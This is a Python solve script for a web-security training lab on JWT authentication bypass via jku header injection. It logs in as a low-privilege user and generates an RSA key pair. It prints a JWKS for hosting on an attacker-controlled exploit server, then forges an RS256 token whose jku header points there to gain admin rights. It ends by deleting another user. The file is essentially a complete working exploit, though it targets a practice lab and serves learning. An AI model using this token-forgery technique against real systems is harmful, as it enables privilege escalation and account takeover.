import argparse
import json
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common import absolute_url, become_admin_payload, delete_carlos, generate_rsa_key, get_session_token, jwk_from_public_key, lab_session, set_session, sign_rs256


parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("--exploit-server", required=True, help="Exploit server base URL that hosts /jwks.json")
known, remaining = parser.parse_known_args()
sys.argv = [sys.argv[0]] + remaining

lab = lab_session("JWT authentication bypass via jku header injection")
lab.login("wiener", "peter")

private_key = generate_rsa_key()
jwk = jwk_from_public_key(private_key.public_key(), "vedant")
lab.info("Host this JWKS at /jwks.json on the exploit server:")
print(json.dumps({"keys": [jwk]}, indent=2))

header, payload = become_admin_payload(get_session_token(lab))
header["alg"] = "RS256"
header["kid"] = jwk["kid"]
header["jku"] = absolute_url(known.exploit_server, "/jwks.json")
forged = sign_rs256(header, payload, private_key)

set_session(lab, forged)
delete_carlos(lab)
